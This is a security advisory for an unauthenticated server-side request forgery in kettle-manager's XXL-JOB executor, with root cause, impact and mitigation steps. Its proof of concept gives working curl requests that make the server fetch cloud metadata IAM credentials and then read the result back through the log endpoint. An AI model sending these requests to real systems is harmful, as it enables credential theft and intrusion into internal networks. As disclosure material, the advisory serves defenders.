# kettle-manager XXL-JOB Executor Unauthenticated SSRF

- **Submitter:** sh7err@vEcho
- **Product:** kettle-manager (数据大师 / sjds)
- **Affected Version:** 0.2.6-SNAPSHOT main branch (default XXL-JOB configuration)
- **Severity:** High (CVSS v3.1 Base Score 7.5 – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

## Summary
The built-in XXL-JOB executor exposes its HTTP management port (default 9998) without setting an `accessToken`. As a result, any remote user can trigger the demo job handler `httpJobHandler`, which performs arbitrary HTTP requests to attacker-controlled URLs. The handler forwards the entire response body to the executor log, which can be retrieved through another unauthenticated request. This constitutes a server-side request forgery (SSRF) primitive that can reach internal services and cloud metadata endpoints from the kettle-manager host.

## Technical Details
- **Files:** `src/main/resources/application-xxljob.yaml:2-27`, `src/main/java/cn/benma666/sjsj/demo/job/XxxJob.java:145-234`
- **Component:** XXL-JOB executor configuration and demo handlers
- **Root Cause:** `xxljob.accessToken` is empty, so executor endpoints lack authentication; `httpJobHandler` accepts arbitrary URLs with no validation.

## Proof of Concept
1. Ensure kettle-manager is running with the default XXL-JOB configuration (port 9998).
2. Trigger the SSRF via `/run`:
   ```bash
   curl -X POST http://<host>:9998/run \
     -H 'Content-Type: application/json' \
     -d '{
           "jobId": 1,
           "executorHandler": "httpJobHandler",
           "executorParams": "url: http://169.254.169.254/latest/meta-data/iam/security-credentials\nmethod: GET",
           "glueType": "BEAN",
           "logId": 601,
           "logDateTime": 0,
           "broadcastIndex": 0,
           "broadcastTotal": 1
         }'
   ```
3. Retrieve the captured response via `/log`:
   ```bash
   curl "http://<host>:9998/log?fromLineNum=1&logId=601&logDateTim=0"
   ```
4. The response body contains the data fetched from the AWS/Aliyun metadata service (or any other internal endpoint the attacker targeted).

## Impact
Attackers can pivot through the executor to reach internal-only services, cloud metadata endpoints, or other sensitive HTTP resources that are otherwise unreachable externally. If the environment exposes metadata services, the attacker can harvest temporary credentials and escalate privileges. The exposed SSRF primitive can also be abused to scan the internal network or trigger requests to third-party targets.

## Mitigation
- Configure a strong `xxljob.accessToken` and ensure both the executor and the admin console enforce it.
- Restrict access to the executor port (9998 by default) to trusted hosts or place it behind a VPN.
- Remove or harden demo handlers such as `httpJobHandler` and `commandJobHandler`, or at minimum enforce URL allowlists/denylists before performing outbound requests.

## References
- https://github.com/majinju/kettle-manager
- https://www.xuxueli.com/xxl-job/

